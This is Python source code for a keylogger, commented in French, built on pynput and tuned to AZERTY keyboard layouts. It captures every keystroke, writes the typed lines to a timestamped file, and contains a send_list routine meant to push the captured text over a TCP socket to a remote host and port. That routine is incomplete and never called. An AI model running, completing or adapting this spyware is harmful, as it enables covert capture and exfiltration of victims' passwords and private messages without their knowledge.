import socket
from pynput import keyboard
import datetime

namefile = datetime.datetime.now().strftime("%I %M%p on %B %d %Y") + ".txt"
f = open(namefile, "w+")

# crée un nouveau fichier texte intitulé date+heure.txt
f.close()

liste = []
string = ''
caps = False
ctrl_l = False
alt_r = False
shift = False

def list(k):
    global liste, string, caps, ctrl_l, shift, alt_r
    if k == 'Key.space':
        liste.append(string + ' ')
        string = ''
    elif k == 'Key.caps_lock':
        caps ^= True
    elif (k == 'Key.backspace') & (string != ''):
        string = string[0:-2]
    elif k == 'Key.enter':
        liste.append(string)
        print(liste)
        with open(namefile, "a") as f:
            f.writelines(liste)
            f.write("\n")
        liste = []
        string = ''
    else:
        if caps == True:
            k = k.upper()
            if k[1] == ",":
                k = "'?'"
            if k[1] == ":":
                k = "'/'"
            if k[1] == ";":
                k = "'.'"
            if k[1] == "&":
                k = "'1'"
            if k[1] == "é":
                k = "'2'"
            if k[1] == "'":
                k = "'4'"
            if k[1] == "(":
                k = "'5'"
            if k[1] == "§":
                k = "'6'"
            if k[1] == "è":
                k = "'7'"
            if k[1] == "!":
                k = "'8'"
            if k[1] == "ç":
                k = "'9'"
            if k[1] == "à":
                k = "'0'"
            if k[1] == "-":
                k = "'_'"
            if k[1] == "$":
                k = "'*'"
            if k[1] == "ù":
                k = "'%'"
            if k[1] == "=":
                k = "'+'"
        if (alt_r == True) and (ctrl_l == True) :
            if k[1] == "é":
                k = "'@'"
            if k[1] == "'":
                k = "'{'"
            if k[1] == "(":
                k = "'['"
            if k[1] == "ç":
                k = "'{'"
            if k[1] == "à":
                k = "'}'"
            if k[1] == "$":
                k = "']'"
        string = string + k[1]


def on_release(key):
    global ctrl_l, alt_r, shift, caps
    if key == keyboard.Key.f10:
        return False  # stop le script
    elif '{0}'.format(key)=='Key.ctrl_l' :
        ctrl_l = False
    elif '{0}'.format(key)=='Key.alt_r' :
        alt_r = False
    elif '{0}'.format(key)=='Key.shift' :
        shift = False
        caps ^= True
    else:
        list('{0}'.format(key))
def on_press(key):
    global ctrl_l, alt_r, shift, caps
    if '{0}'.format(key)=='Key.ctrl_l' :
        ctrl_l = True
    if '{0}'.format(key)=='Key.alt_r' :
        alt_r = True
    if '{0}'.format(key)=='Key.shift' :
        shift = True
        caps ^= True

def send_list():
    global liste
    socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    socket.connect((hote, port))
    socket.send("DESC leNomDuFichier".encode("latin1"))
    for line in liste:
        socket.send(("SEND {}".format(line)).encode("latin1"))
    socket.send("STOCK".encode("latin1"))


with keyboard.Listener(on_press=on_press,on_release=on_release) as listener:
    listener.join()
